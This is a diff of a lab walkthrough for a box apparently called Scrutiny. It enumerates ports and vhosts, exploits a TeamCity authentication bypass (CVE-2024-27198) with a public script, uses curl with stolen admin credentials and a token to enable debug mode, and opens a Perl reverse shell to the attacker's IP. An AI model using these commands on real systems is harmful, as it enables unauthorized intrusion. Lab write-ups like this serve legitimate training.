@@ -1,4 +1,4 @@
-Nmap scan.
+	Nmap scan.
 ```sh
  nmap -p- --min-rate 5000 -T4 -Pn 192.168.108.91
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-26 19:57 IST
@@ -49,3 +49,78 @@ Visiting web server on port 80. Additionally, hostname was also mentioned on web
 ![](Images/Scrutiny2.png)
 We added hostname to /etc/hosts file.
 
+Just in case, I fuzzed for vhosts. This is my go-to vhost fuzzing command:
+```sh
+ffuf -H "Host: FUZZ.onlyrands.com" -u http://onlyrands.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -c -fc 403,404 -fs 23375
+```
+
+![](Images/Scrutiny3.png)
+Make sure to add filter otherwise above command will give lot of subdomains which will create confusion.
+ffuf shows me a teams vhost. Make sure to add the new vhost to /etc/hosts.
+Upon visiting, we have a TeamCity page.
+![](Images/Scrutiny5.png)
+There are some very popular recent TeamCity authentication bypass exploits.
+https://github.com/Stuub/RCity-CVE-2024-27198?source=post_page-----01737dd96583---------------------------------------
+
+```python
+python3 RCity.py -t http://teams.onlyrands.com --no-enum -c id
+```
+I had to tack on a -c argument for the shell not to exit automatically.
+
+Oh no! But when I enter a command, I get something like this:
+![](Images/Scrutiny6.png)
+At this point I googled the error, and found 0xdf’s writeup:
+https://0xdf.gitlab.io/2024/08/24/htb-runner.html?source=post_page-----01737dd96583---------------------------------------
+Turns out we need to **enable debug mode.** We will do this using a POST request with curl.
+
+In order to do this, we first need to get an an admin token using our admin creds.
+
+```sh
+curl -X POST http://teams.onlyrands.com/app/rest/users/id:22/tokens/RPC2 -u RCity_Rules_615:iRiYgRHk
+```
+
+Where, id, username and password  were received when we ran the exploit 1st time. Highlighted in above POC.
+![](Images/Scrutiny7.png)
+Take that token from the “value” field, then export to the TOKEN environment variable.
+```sh
+export TOKEN="eyJ0eXAiOiAiVENWMiJ9.cUx0UTAtdGtPMV90TWlMdVpPMk5xR2ZhcE1j.YWJlMjE4NjgtMzMxZS00ZjA5LTg0NTgtZjkxMDcxODgxMDU2"
+```
+
+```sh
+curl -X POST 'http://teams.onlyrands.com/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true' -H "Authorization: Bearer $TOKEN"
+```
+
+![](Images/Scrutiny8.png)
+Then refresh:
+```sh
+curl 'http://teams.onlyrands.com/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties' -H "Authorization: Bearer $TOKEN"
+```
+![](Images/Scrutiny9.png)
+
+Then run **python3 RCity.py -t** [**http://teams.onlyrands.com/**](http://teams.onlyrands.com/) **-c id** again, now that debug mode is enabled.
+
+```sh
+python3 RCity.py -t http://teams.onlyrands.com -c id
+```
+![](Images/Scrutiny10.png)
+
+Here, we are unable to change the working directory. So we decide to take reverse shell. I tried running bash, nc reverse shells but they didn't work.
+![](Images/Scrutiny11.png)
+So, after referring a writeup we decided to run a perl reverse shell and we got the shell.
+```sh
+perl -e 'use Socket;$i="192.168.45.238";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+![](Images/Scrutiny12.png)
+![](Images/Scrutiny13.png)
+Captured local flag.
+![](Images/Scrutiny14.png)
+
+### Privilege Escalation
+When we tried to check sudo permissions we failed.
+![](Images/Scrutiny15.png)
+When I did this box, I noticed through the TeamCity admin portal that marcot accidentally gave us an id_rsa.
+![](Images/Scrutiny16.png)
+You can also find it through running **git log** on /srv/git/freelancers/marcot.git. But it’s obviously easier to download through the site, so just use creds you made through the exploit and do that.
+
+When trying to run it locally, you see that you need a password for the id_rsa key.
